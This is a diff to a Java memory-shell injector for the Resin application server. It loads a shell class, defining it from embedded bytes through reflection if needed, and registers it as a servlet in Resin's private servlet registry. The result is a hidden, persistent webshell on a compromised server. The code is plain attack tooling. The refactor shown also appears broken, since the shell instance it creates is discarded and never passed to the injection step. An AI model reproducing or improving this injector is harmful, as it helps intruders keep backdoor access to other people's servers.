@@ -16,7 +16,7 @@ import java.util.zip.GZIPInputStream;
  */
 public class ResinServletInjector {
     
-    private static boolean ok = false;
+    private static boolean ok;
 
     private static String shellClassName;
     private static String shellClass;
@@ -32,14 +32,12 @@ public class ResinServletInjector {
         } catch (Throwable throwable) {
             
         }
-        if (contexts == null || contexts.isEmpty()) {
-          
-        } else {
+        if (contexts != null) {
             for (Object context : contexts) {
                 try {
                    
-                    Object shell = getShell(context);
-                    inject(context, shell);
+                    loadShell(context);
+                    inject(context);
                     
                 } catch (Throwable e) {
                    
@@ -77,9 +75,9 @@ public class ResinServletInjector {
     }
 
     
-    private Object getShell(Object context) throws Exception {
+    private void loadShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz = null;
+        Class<?> clazz;
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
@@ -88,10 +86,10 @@ public class ResinServletInjector {
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
-        return clazz.getDeclaredConstructor().newInstance();
+        clazz.getDeclaredConstructor().newInstance();
     }
 
-    private void inject(Object context, Object servlet) throws Exception {
+    private void inject(Object context) throws Exception {
         Object servletMapValue = getFieldValue(getFieldValue(context, "_servletManager"), "_servlets");
         if (!(servletMapValue instanceof Map<?, ?>)) {
             throw new IllegalStateException("Resin servlet registry not found");
